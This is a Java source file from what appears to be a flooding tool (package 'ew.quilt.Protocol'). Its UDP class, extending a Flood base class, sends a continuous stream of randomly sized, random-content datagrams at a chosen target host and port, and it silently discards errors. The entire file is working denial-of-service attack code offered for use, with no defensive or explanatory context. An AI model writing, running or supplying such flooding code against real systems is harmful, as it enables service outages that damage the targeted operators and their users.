package ew.quilt.Protocol;

import ew.quilt.util.Randomizer;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class UDP extends Flood {

    private DatagramSocket socket;
    private DatagramPacket packet;

    private byte[] byteSend;

    public UDP(String target, int port) {
        super(target, port);
    }

    @Override
    public void run() {
        while (isFlooding()) {
            try {
                socket = new DatagramSocket();
                socket.connect(InetAddress.getByName(getTarget()), getPort());

                byteSend = new byte[Randomizer.nextInt(65500)];
                Randomizer.nextBytes(byteSend);

                packet = new DatagramPacket(byteSend, byteSend.length);
                socket.send(packet);
                socket.close();
            } catch (Exception ex) {
            }
        }
    }
}
